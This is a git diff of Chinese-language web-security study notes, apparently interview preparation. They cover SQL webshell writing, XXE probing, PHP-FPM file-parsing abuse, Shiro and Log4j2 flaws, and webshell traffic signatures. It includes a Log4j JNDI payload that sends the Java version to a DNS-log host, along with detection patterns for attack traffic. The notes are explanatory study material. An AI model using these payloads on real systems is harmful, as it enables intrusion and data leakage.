@@ -1,20 +1,16 @@
+
+
 ## SQL
 
 ##### MySQL的网站中，5.0以下与5.0以上有什么区别？
 
 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。
 
+SQL写shell的条件：
 
-
-
-
-
-
-
-
-
-
-
+- 有写入权限
+- 知道网站绝对路径
+- 允许导出文件
 
 
 
@@ -170,6 +166,10 @@ B登录上去后，在URL栏将信息改成A的然后进行访问，即可查询
 
 可以利用这个漏洞读取本地文件、php文件、内部开放端口这些，还有就是ddos攻击
 
+```
+实战中的运用：检测服务器是否支持DTD引用外部实体但实际操作过程中，一般都是直接抓包看有没有使用XML,有就是直接往外部实体上套一下试试
+```
+
 
 
 防范：
@@ -254,7 +254,7 @@ PUT漏洞
 
 
 
-文件解析：当文件配置中security.limit_extensions = .php这一选项没有，则可以在网站根目录里建一个shell.jpg文件，在里面写入phpinfo()，然后打开，然后利用文件解析漏洞，输入url后面跟上shell.jpg/2.php，网站就会执行之前写入的命令
+文件解析：当文件配置中security.limit_extensions = .php这一选项没有，上传一个.jpg的文件，里面写一些php恶意语句，访问xxx.jpg/xxx.php这个的目录时服务器会直接将.jpg作为php文件进行解析
 
 目录遍历：也是配置上的问题
 
@@ -290,6 +290,12 @@ war后门文件部署：如果jBoss后台管理页面存在弱口令，可以通
 
 这两个漏洞主要区别在于Shiro550使用已知密钥碰撞，只要有足够密钥库（条件较低），不需要Remember Cookie。Shiro721的aes加密的key基本猜不到，系统随机生成，可使用登录后rememberMe去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击，难度高。
 
+shiro流量特征：
+
+```
+数据包含有多个$$$符号，C参数含有base64编码
+```
+
 
 
 ## Log4j2漏洞复现
@@ -310,10 +316,16 @@ ${prefix:key}
 ```
 
 ```
-最常见的payload：${jndi:ldap://2lnhn2.ceye.io}
+最常见的payload：
+${jndi:ldap://${sys:java.version}.dns平台得到的域名}	
 ```
 
+流量特征：
 
+```
+ ${jndi:ldap://
+ ${jndi:rmi:// 
+```
 
 
 
@@ -373,7 +385,7 @@ asp OnError ResumeNext，response
 
 3.0 分析流量发现相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key，改为用连接密码 md5 加密后的前 16 位值作为密钥
 
-冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream；
+冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream，还有fileoutstream字段；
 
 content-length 请求长度，对于密钥交互，获取基本信息来讲，payload都为固定长度，所以我们可以看多个数据包中payload是不是固定长度就行
 
@@ -385,5 +397,3 @@ content-length 请求长度，对于密钥交互，获取基本信息来讲，pa
 
 jsp文件里有"pass="，而且发起连接时服务器返回的Content-Length是0
 
-判断它是基于什么方法注入的内存马，可以查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。
-通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法，根据业务使用的组件，排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。
